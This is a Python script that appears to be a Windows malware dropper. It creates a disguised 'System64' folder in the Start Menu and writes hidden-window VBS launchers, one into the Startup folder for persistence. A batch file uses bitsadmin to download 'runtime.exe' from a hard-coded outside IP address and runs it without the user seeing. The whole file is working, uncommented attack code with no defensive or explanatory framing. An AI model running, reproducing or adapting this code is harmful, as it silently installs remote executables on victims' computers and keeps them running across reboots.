import os
import subprocess
login = os.getlogin()

path_system64 = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64"
path_startup   = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

if not os.path.exists(path_system64):
    os.mkdir(path_system64)

    # --- WIN32.vbs ---
    with open(f"{path_system64}\\WIN32.vbs", "a") as f:
        f.write(
            'Set WshShell = CreateObject("WScript.Shell")\n'
            f'WshShell.Run chr(34) & "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\WIN32.bat" & Chr(34), 0\n'
            'Set WshShell = Nothing'
        )

    # --- WIN64.vbs ---
    with open(f"{path_startup}\\WIN64.vbs", "a") as f:
        f.write(
            'Set WshShell = CreateObject("WScript.Shell")\n'
            f'WshShell.Run chr(34) & "C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe" & Chr(34), 0\n'
            'Set WshShell = Nothing'
        )

    # --- WIN32.bat ---
    with open(f"{path_system64}\\WIN32.bat", "a") as f:
        f.write(
            f'bitsadmin /transfer mydownloadjob /download /priority FOREGROUND '
            f'"http://20.93.23.234:8081/dl/runtime.exe" '
            f'"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe"\n'
            f'start "" "{path_startup}\\WIN64.vbs"'
        )

    # --- Execute VBS ---
    subprocess.run(f'"{path_system64}\\WIN32.vbs"', shell=True, check=True)

else:
    pass
